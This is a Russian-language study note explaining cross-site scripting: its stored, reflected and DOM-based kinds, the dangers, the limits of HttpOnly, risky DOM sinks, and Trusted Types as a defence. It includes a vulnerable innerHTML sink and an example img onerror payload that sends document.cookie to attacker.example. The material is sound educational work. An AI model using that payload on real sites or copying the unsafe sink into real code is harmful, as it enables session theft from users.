# Что такое XSS?

> [!NOTE]
> XSS - уязвимость, при которой атакующий заставляет сайт выполнить чужой JavaScript в браузере пользователя. Через XSS можно украсть данные, выполнить действия от имени пользователя, изменить UI или обойти часть защит.

## Вопрос

Что такое XSS? Какие виды XSS бывают и чем он опасен?

## Пример идеи

Если приложение вставляет пользовательский ввод как HTML:

```ts
element.innerHTML = userComment;
```

А пользователь отправил:

```html
<img src=x onerror="fetch('https://attacker.example?c=' + document.cookie)">
```

браузер может выполнить вредный код.

## Основные виды XSS

| Вид | Как возникает |
|---|---|
| Stored XSS | payload сохранен на сервере и показывается другим пользователям |
| Reflected XSS | payload приходит в request и сразу отражается в response |
| DOM XSS | frontend JS сам небезопасно обрабатывает данные в DOM |

## Почему XSS опасен?

Вредный JS выполняется в контексте сайта. Он может:

- читать DOM;
- отправлять requests от имени пользователя;
- читать `localStorage` и `sessionStorage`;
- менять страницу;
- перехватывать ввод;
- иногда обходить CSRF-защиты, если может прочитать token со страницы.

## HttpOnly и XSS

`HttpOnly` cookie не даст JS прочитать cookie напрямую:

```http
Set-Cookie: sid=abc; HttpOnly
```

Но XSS все равно опасен: malicious script может отправлять requests с этой cookie, потому что browser добавит ее автоматически.

## Что важно помнить

- React экранирует текст в JSX, но не защищает `dangerouslySetInnerHTML`, ссылки `href="javascript:..."` и прямую работу с DOM.
- Источники DOM XSS: `location.hash`, `location.search`, `postMessage`, данные из `localStorage` и ответов API.
- Опасные приемники (sinks): `innerHTML`, `outerHTML`, `document.write`, `eval`, `setTimeout` со строкой, `new Function`.
- Защиту от XSS удобно усиливать Trusted Types: браузер разрешит запись в опасные sinks только через политику.

## Мини-шпаргалка

- XSS - выполнение чужого JS на твоем сайте.
- Stored XSS сохраняется в данных.
- Reflected XSS отражается из request.
- DOM XSS возникает на client side.
- `localStorage` доступен при XSS.
- `HttpOnly` помогает, но не делает XSS безопасным.
